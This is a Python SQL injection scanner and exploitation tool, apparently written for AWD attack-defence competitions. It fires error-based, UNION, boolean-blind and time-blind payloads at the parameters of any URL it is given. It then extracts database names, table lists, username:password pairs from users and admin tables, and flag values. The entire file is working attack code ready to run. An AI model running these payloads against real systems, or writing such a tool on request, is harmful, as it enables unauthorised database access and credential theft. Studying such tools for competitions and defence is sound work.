#!/usr/bin/env python3
"""
AWD SQL 注入扫描与利用工具
支持: 错误型/联合查询/布尔盲注/时间盲注, 自动数据提取
"""

import requests
import re
import time
import sys
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


class SQLiScanner:
    def __init__(self, url, method='GET', data=None, headers=None, cookies=None, timeout=10):
        self.url = url
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        if self.cookies:
            for k, v in self.cookies.items():
                self.session.cookies.set(k, v)
        self.base_response = None
        self.base_content_length = 0
        self.results = []

    def _send_request(self, url, data=None):
        try:
            if self.method == 'GET':
                resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            else:
                resp = self.session.post(url, data=data, timeout=self.timeout, allow_redirects=True)
            return resp
        except requests.exceptions.Timeout:
            return None
        except Exception as e:
            return None

    def _get_params(self):
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        params = {k: v[0] if len(v) == 1 else v for k, v in params.items()}
        return params, parsed

    def _build_url_with_param(self, param_name, value):
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        params[param_name] = [value]
        new_query = urlencode(params, doseq=True)
        new_parsed = parsed._replace(query=new_query)
        return urlunparse(new_parsed)

    def _build_data_with_param(self, param_name, value):
        data = dict(self.data)
        data[param_name] = value
        return data

    # ========= 1. 错误型注入检测 =========
    def detect_error_based(self):
        """检测错误回显型 SQL 注入"""
        error_payloads = [
            ("'", "syntax error|unclosed quotation|mysql|sql"),
            ("' OR '1'='1", None),
            ("' OR 1=1--", None),
            ("\" OR \"1\"=\"1", None),
            (") OR 1=1--", None),
            ("' AND 1=CONVERT(int, @@version)--", None),
            ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x GROUP BY x)a)--", "Duplicate entry"),
            ("' AND extractvalue(1,concat(0x7e,(SELECT version())))--", "XPATH syntax error"),
            ("' AND updatexml(1,concat(0x7e,(SELECT version())),1)--", "XPATH syntax error"),
        ]

        params, _ = self._get_params()
        print(f"\n[*] 检测错误型注入, 共 {len(params)} 个参数")

        for param_name in params:
            for payload, error_pattern in error_payloads:
                if self.method == 'GET':
                    test_url = self._build_url_with_param(param_name, payload)
                    resp = self._send_request(test_url)
                else:
                    test_data = self._build_data_with_param(param_name, payload)
                    resp = self._send_request(self.url, test_data)

                if resp is None:
                    continue

                if error_pattern:
                    if re.search(error_pattern, resp.text, re.IGNORECASE):
                        self.results.append({
                            'type': 'error_based',
                            'param': param_name,
                            'payload': payload,
                            'evidence': f"匹配错误特征: {error_pattern}",
                            'severity': 'high'
                        })
                        print(f"  [!!!] 发现错误型注入: 参数={param_name} Payload={payload[:50]}")
                        break
                else:
                    if resp.status_code != 200 or abs(len(resp.text) - self.base_content_length) > 5000:
                        self.results.append({
                            'type': 'error_based',
                            'param': param_name,
                            'payload': payload,
                            'evidence': f"响应差异: 状态码={resp.status_code} 长度差={abs(len(resp.text)-self.base_content_length)}",
                            'severity': 'medium'
                        })

    # ========= 2. 联合查询注入检测 =========
    def detect_union_based(self):
        """检测 UNION 注入"""
        union_payloads = [
            "UNION SELECT 1--",
            "UNION SELECT 1,2--",
            "UNION SELECT 1,2,3--",
            "UNION SELECT 1,2,3,4--",
            "UNION SELECT 1,2,3,4,5--",
            "UNION SELECT 1,2,3,4,5,6--",
            "' UNION SELECT 1--",
            "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT 1,2,3,4,5--",
        ]

        params, _ = self._get_params()
        print(f"\n[*] 检测联合查询注入")

        for param_name in params:
            # 先找闭合方式
            for quote in ["", "'", '"']:
                # 判断列数
                for cols in range(1, 10):
                    orderby_payload = f"{quote} ORDER BY {cols}--"
                    if self.method == 'GET':
                        test_url = self._build_url_with_param(param_name, orderby_payload)
                        resp = self._send_request(test_url)
                    else:
                        test_data = self._build_data_with_param(param_name, orderby_payload)
                        resp = self._send_request(self.url, test_data)

                    if resp is None:
                        continue

                    if cols == 1:
                        self.base_content_length = len(resp.text)

                    if resp.status_code in [500, 200]:
                        # 继续
                        continue
                    else:
                        break

                # UNION 注入测试
                for payload in union_payloads:
                    full_payload = f"{quote}{payload}" if quote else payload
                    if self.method == 'GET':
                        test_url = self._build_url_with_param(param_name, full_payload)
                        resp = self._send_request(test_url)
                    else:
                        test_data = self._build_data_with_param(param_name, full_payload)
                        resp = self._send_request(self.url, test_data)

                    if resp is None:
                        continue

                    # 检查是否有数据回显 (通过特征字符串或长度变化)
                    if re.search(r'root|mysql|version|database|user', resp.text, re.IGNORECASE) or \
                       (abs(len(resp.text) - self.base_content_length) > 100 and self.base_content_length > 0):
                        self.results.append({
                            'type': 'union_based',
                            'param': param_name,
                            'payload': full_payload,
                            'evidence': "UNION 注入可能存在, 有数据回显",
                            'severity': 'high'
                        })
                        print(f"  [!!!] 发现联合查询注入: 参数={param_name}")
                        break

    # ========= 3. 布尔盲注检测 =========
    def detect_boolean_based(self):
        """检测布尔盲注 (true/false 页面差异)"""
        true_payloads = [
            "1 AND 1=1--",
            "' AND '1'='1'--",
            "1' AND '1'='1",
        ]
        false_payloads = [
            "1 AND 1=2--",
            "' AND '1'='2'--",
            "1' AND '1'='2",
        ]

        params, _ = self._get_params()
        print(f"\n[*] 检测布尔盲注")

        for param_name in params:
            for true_pl, false_pl in zip(true_payloads, false_payloads):
                if self.method == 'GET':
                    true_url = self._build_url_with_param(param_name, true_pl)
                    false_url = self._build_url_with_param(param_name, false_pl)
                    resp_true = self._send_request(true_url)
                    resp_false = self._send_request(false_url)
                else:
                    true_data = self._build_data_with_param(param_name, true_pl)
                    false_data = self._build_data_with_param(param_name, false_pl)
                    resp_true = self._send_request(self.url, true_data)
                    resp_false = self._send_request(self.url, false_data)

                if resp_true is None or resp_false is None:
                    continue

                len_diff = abs(len(resp_true.text) - len(resp_false.text))
                status_diff = resp_true.status_code != resp_false.status_code

                if len_diff > 50 or status_diff:
                    self.results.append({
                        'type': 'boolean_based',
                        'param': param_name,
                        'payload_true': true_pl,
                        'payload_false': false_pl,
                        'evidence': f"true长度={len(resp_true.text)} false长度={len(resp_false.text)} 差={len_diff}",
                        'severity': 'high'
                    })
                    print(f"  [!!!] 发现布尔盲注: 参数={param_name} 长度差={len_diff}")
                    break

    # ========= 4. 时间盲注检测 =========
    def detect_time_based(self):
        """检测时间盲注"""
        time_payloads = [
            "1 AND SLEEP(3)--",
            "' AND SLEEP(3)--",
            "1' AND SLEEP(3)--",
            "1; WAITFOR DELAY '0:0:3'--",
            "'; WAITFOR DELAY '0:0:3'--",
            "1' AND IF(1=1,SLEEP(3),0)--",
            "1' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))=97,SLEEP(3),0)--",
        ]

        params, _ = self._get_params()
        print(f"\n[*] 检测时间盲注")

        for param_name in params:
            for payload in time_payloads:
                if self.method == 'GET':
                    test_url = self._build_url_with_param(param_name, payload)
                    start = time.time()
                    resp = self._send_request(test_url)
                    elapsed = time.time() - start
                else:
                    test_data = self._build_data_with_param(param_name, payload)
                    start = time.time()
                    resp = self._send_request(self.url, test_data)
                    elapsed = time.time() - start

                if elapsed >= 3:
                    self.results.append({
                        'type': 'time_based',
                        'param': param_name,
                        'payload': payload,
                        'evidence': f"响应耗时={elapsed:.2f}s",
                        'severity': 'high'
                    })
                    print(f"  [!!!] 发现时间盲注: 参数={param_name} 耗时={elapsed:.2f}s")
                    break

    # ========= 5. 数据提取 (联合查询) =========
    def extract_data_union(self, param_name, quote=""):
        """通过联合查询提取数据"""
        print(f"\n[*] 提取数据 - 参数={param_name}")

        extract_queries = [
            ("version", "SELECT @@version"),
            ("database", "SELECT DATABASE()"),
            ("user", "SELECT USER()"),
            ("current_user", "SELECT CURRENT_USER()"),
            ("hostname", "SELECT @@hostname"),
            ("databases", "SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata"),
            ("tables", "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()"),
            ("columns", "SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'"),
            ("users", "SELECT GROUP_CONCAT(username,0x3a,password) FROM users"),
            ("admin", "SELECT GROUP_CONCAT(username,0x3a,password) FROM admin"),
            ("flag", "SELECT GROUP_CONCAT(flag) FROM flag"),
        ]

        for label, query in extract_queries:
            payload = f"{quote} UNION SELECT {query}--"
            if self.method == 'GET':
                test_url = self._build_url_with_param(param_name, payload)
                resp = self._send_request(test_url)
            else:
                test_data = self._build_data_with_param(param_name, payload)
                resp = self._send_request(self.url, test_data)

            if resp and resp.text:
                print(f"  [{label}]: 提取中...")
                self.results.append({
                    'extract': label,
                    'payload': payload,
                    'raw': resp.text[:500]
                })

    # ========= 6. 数据提取 (布尔盲注 - 逐字符) =========
    def extract_data_boolean(self, param_name, max_length=100):
        """通过布尔盲注逐字符提取数据"""
        print(f"\n[*] 布尔盲注数据提取 - 参数={param_name}")

        target_queries = [
            ("database", "DATABASE()"),
            ("version", "@@version"),
            ("user", "USER()"),
        ]

        for label, query in target_queries:
            extracted = ""
            for pos in range(1, max_length + 1):
                found = False
                for char_code in range(32, 127):
                    char = chr(char_code)
                    payload = f"1' AND ASCII(SUBSTRING(({query}),{pos},1))={char_code}--"

                    if self.method == 'GET':
                        test_url = self._build_url_with_param(param_name, payload)
                        resp = self._send_request(test_url)
                    else:
                        test_data = self._build_data_with_param(param_name, payload)
                        resp = self._send_request(self.url, test_data)

                    if resp and abs(len(resp.text) - self.base_content_length) > 50:
                        extracted += char
                        found = True
                        print(f"\r  [{label}]: {extracted}", end='', flush=True)
                        break
                if not found:
                    break

            print()
            print(f"  [{label}]: {extracted}")
            self.results.append({
                'extract': label,
                'value': extracted
            })

    # ========= 7. 数据提取 (时间盲注) =========
    def extract_data_time(self, param_name, max_length=100):
        """通过时间盲注逐字符提取数据"""
        print(f"\n[*] 时间盲注数据提取 - 参数={param_name}")

        target_queries = [
            ("database", "DATABASE()"),
            ("user", "USER()"),
        ]

        for label, query in target_queries:
            extracted = ""
            for pos in range(1, max_length + 1):
                found = False
                for char_code in range(32, 127):
                    char = chr(char_code)
                    payload = f"1' AND IF(ASCII(SUBSTRING(({query}),{pos},1))={char_code},SLEEP(2),0)--"

                    if self.method == 'GET':
                        test_url = self._build_url_with_param(param_name, payload)
                        start = time.time()
                        resp = self._send_request(test_url)
                        elapsed = time.time() - start
                    else:
                        test_data = self._build_data_with_param(param_name, payload)
                        start = time.time()
                        resp = self._send_request(self.url, test_data)
                        elapsed = time.time() - start

                    if elapsed >= 2:
                        extracted += char
                        found = True
                        print(f"\r  [{label}]: {extracted}", end='', flush=True)
                        break
                if not found:
                    break

            print()
            print(f"  [{label}]: {extracted}")
            self.results.append({
                'extract': label,
                'value': extracted
            })

    # ========= 完整扫描流程 =========
    def full_scan(self):
        """执行完整 SQL 注入扫描"""
        print("="*60)
        print("  AWD SQL 注入扫描器")
        print("="*60)
        print(f"目标: {self.url}")
        print(f"方法: {self.method}")

        # 获取基线响应
        if self.method == 'GET':
            self.base_response = self._send_request(self.url)
        else:
            self.base_response = self._send_request(self.url, self.data)
        if self.base_response:
            self.base_content_length = len(self.base_response.text)
            print(f"基线响应长度: {self.base_content_length}")

        self.detect_error_based()
        self.detect_union_based()
        self.detect_boolean_based()
        self.detect_time_based()

        # 输出结果
        print("\n" + "="*60)
        print("  扫描结果汇总")
        print("="*60)
        vuln_results = [r for r in self.results if 'severity' in r]
        if vuln_results:
            for r in vuln_results:
                print(f"  [严重] {r['type']} - 参数: {r['param']}")
                print(f"    Payload: {r['payload'][:80]}")
                print(f"    证据: {r.get('evidence','N/A')}")
        else:
            print("  未发现 SQL 注入漏洞")

        return self.results


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("用法:")
        print("  GET 模式: python3 sql_injection.py <url>")
        print("  POST 模式: python3 sql_injection.py <url> --post 'param1=val1&param2=val2'")
        print("  带 Cookie: python3 sql_injection.py <url> --cookie 'session=xxx'")
        sys.exit(1)

    url = sys.argv[1]
    method = 'GET'
    data = {}
    cookies = {}

    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '--post' and i + 1 < len(sys.argv):
            method = 'POST'
            for pair in sys.argv[i+1].split('&'):
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    data[k] = v
            i += 2
        elif sys.argv[i] == '--cookie' and i + 1 < len(sys.argv):
            for pair in sys.argv[i+1].split(';'):
                pair = pair.strip()
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    cookies[k.strip()] = v.strip()
            i += 2
        else:
            i += 1

    scanner = SQLiScanner(url, method=method, data=data, cookies=cookies)
    results = scanner.full_scan()
